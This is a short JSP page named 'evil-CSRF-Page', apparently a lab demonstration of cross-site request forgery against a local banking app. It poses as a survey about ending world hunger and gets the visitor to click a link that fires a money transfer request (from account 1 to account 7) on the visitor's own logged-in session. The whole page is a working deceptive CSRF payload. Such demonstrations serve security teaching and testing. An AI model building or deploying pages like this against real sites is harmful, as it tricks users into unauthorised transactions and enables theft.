<%-- 
    Document   : evil-CSRF-Page
    Created on : Apr 21, 2023, 2:49:09 PM
    Author     : root
--%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Hello User</title>
    </head>
    <body>
        <h1>Hello User, this is a survey to see if people would like to end world hunger click the link if you agree</h1>
        <a href="http://localhost:8080/accounts/Transfer?to=7&from=1&amount=10">END WORLD HUNGER</a>
    </body>
</html>
